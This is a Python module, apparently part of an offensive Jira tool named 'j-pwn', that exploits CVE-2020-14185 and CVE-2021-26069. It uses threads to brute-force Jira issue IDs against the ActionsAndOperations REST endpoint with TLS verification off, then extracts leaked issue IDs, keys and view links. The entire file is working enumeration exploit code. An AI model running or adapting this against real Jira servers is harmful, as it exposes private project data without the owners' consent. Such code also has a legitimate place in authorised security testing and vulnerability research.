import requests
from urllib.parse import urlparse
from colorama import Fore, Style
import threading

def check_issue_key(base_url, issue_id, vulnerabilities):
    """
    Checks a single issue key for enumeration vulnerability and parses the response for successful attempts.
    """
    issue_key = f"{base_url.rstrip('/')}/rest/api/1.0/issues/{issue_id}/ActionsAndOperations"
    headers = {
        'X-Atlassian-Token': 'no-check'
    }

    try:
        response = requests.get(issue_key, headers=headers, allow_redirects=False, verify=False)
        
        if response.status_code == 200 and "<availableActionsAndOperationsWrapper>" in response.text:
            vulnerability_detail = f"+ [CVE-2020-14185 | CVE-2021-26069] Vulnerable to issue enumeration via ActionsAndOperations: {issue_key}"
            vulnerabilities.append(vulnerability_detail)
            print(f"{Fore.GREEN}[+] [CVE-2020-14185 | CVE-2021-26069] Vulnerable to issue enumeration via ActionsAndOperations: {issue_key}{Style.RESET_ALL}")

            # Parse and display relevant details
            if "<id>" in response.text and "<key>" in response.text:
                id_start = response.text.find("<id>") + 4
                id_end = response.text.find("</id>", id_start)
                key_start = response.text.find("<key>") + 5
                key_end = response.text.find("</key>", key_start)
                view_issue_start = response.text.find("<viewIssue>") + 11
                view_issue_end = response.text.find("</viewIssue>", view_issue_start)

                issue_id = response.text[id_start:id_end]
                issue_key = response.text[key_start:key_end]
                view_issue = response.text[view_issue_start:view_issue_end]

                print("\n  Enumerated Operations:")
                print(f"    - Issue ID: {issue_id}")
                print(f"    - Issue Key: {issue_key}")
                print(f"    - View Issue: {view_issue}")
        elif response.status_code == 404:
            print(f"{Fore.YELLOW}- Issue ID {issue_id} not found (HTTP 404){Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}- No enumeration detected for issue ID {issue_id}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}- HTTP Code: {response.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}* An error occurred while checking issue ID {issue_id}: {e}{Style.RESET_ALL}")

def check_cve_actions_operations_enumeration_threaded(base_url, start_id=10000, end_id=20000, num_threads=10):
    """
    Uses threading to brute-force enumeration of issue keys from start_id to end_id.
    """
    print(f"\n{Fore.YELLOW}INFO: IssueID Enumeration via ActionsAndOperations Resource with threading{Style.RESET_ALL}")
    vulnerabilities = []  # List to store discovered vulnerabilities
    threads = []

    # Worker function for threads
    def worker(issue_range):
        for issue_id in issue_range:
            check_issue_key(base_url, issue_id, vulnerabilities)

    # Split the range of issue IDs into chunks for each thread
    total_issues = end_id - start_id + 1
    chunk_size = total_issues // num_threads

    for i in range(num_threads):
        start_range = start_id + i * chunk_size
        end_range = start_id + (i + 1) * chunk_size if i < num_threads - 1 else end_id
        thread = threading.Thread(target=worker, args=(range(start_range, end_range + 1),))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    return vulnerabilities  # Return the discovered vulnerabilities

def check_cve_2020_14185(base_url, path, start_id=10000, end_id=20000, num_threads=10):
    """
    Entry point for the enumeration check within the j-pwn.py main program.
    """
    full_url = base_url + path
    vulnerabilities = check_cve_actions_operations_enumeration_threaded(base_url, start_id, end_id, num_threads)

    # Print all found vulnerabilities at the end
    if vulnerabilities:
        print(f"{Fore.GREEN}\nFound vulnerabilities:{Style.RESET_ALL}")
        for vuln in vulnerabilities:
            print(vuln)
    else:
        print(f"{Fore.YELLOW}\nNo vulnerabilities found during brute force.{Style.RESET_ALL}")
